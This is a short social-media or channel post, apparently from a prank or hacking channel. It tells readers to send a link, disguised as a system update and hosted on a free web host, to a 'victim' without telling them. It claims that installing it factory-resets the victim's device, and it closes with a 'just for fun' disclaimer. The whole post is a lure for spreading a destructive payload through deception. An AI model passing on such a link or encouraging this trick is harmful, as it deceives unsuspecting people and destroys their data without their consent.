letter
😈 Copy below link and send it your victim and 
say nothing to him. when he install it in his 
device it will be factory reset and lot more happens.
👇
 
L1NK :- https://sysubdatezz.000webhostapp.com
 
👆
Use only for fun purpose not for harming someone .
And our channel is not responsible for any kind of loss 
you do to other's by this script.